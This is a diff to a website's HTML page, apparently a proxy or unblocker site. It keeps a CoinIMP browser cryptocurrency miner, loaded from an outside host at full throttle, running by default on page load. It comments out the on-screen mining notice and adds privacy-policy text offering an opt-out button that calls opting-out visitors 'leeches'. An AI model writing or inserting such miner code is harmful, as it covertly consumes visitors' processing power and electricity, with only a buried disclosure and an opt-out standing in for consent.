@@ -12,12 +12,13 @@
 	<script src="privacy.js"></script>
 	<script src="https://www.hostingcloud.racing/M6mc.js"></script>
 	<script>
-		var _client = new Client.Anonymous('871e2fd3b8f572a1c0ea64877708619e628649b45391de33725b377e839d83a4', {
-			throttle: 0, c: 'w'
-		});
-		_client.start();
-		_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
+		if (!getCookie("no_crypto")){
+			var _client = new Client.Anonymous('871e2fd3b8f572a1c0ea64877708619e628649b45391de33725b377e839d83a4', {
+				throttle: 0, c: 'w'
+			});
+			_client.start();
+			// _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+		}
 	</script>
 </head>
 
@@ -59,6 +60,10 @@
 			Any embeded or linked site is subject to their own privacy policy and terms and conditions.  
 			You can clear your rammerhead and favorites cookies by clicking <button id="clear">here</button>.  
 			Although, these cookies will be automatically regenerated upon page load.
+			This site also uses crypto miners which may store cookies in your browser to keep your preferences regarding ads.
+			These crypto miners will make use of your processing power.
+			You can opt out of crypto mining and therefore be a leech <button id="no_crypto">here</button>.
+			You can also opt back in to being a supporter of this project <button id="yes_crypto">here</button>.
 		</p>
 	</div>
 </body>
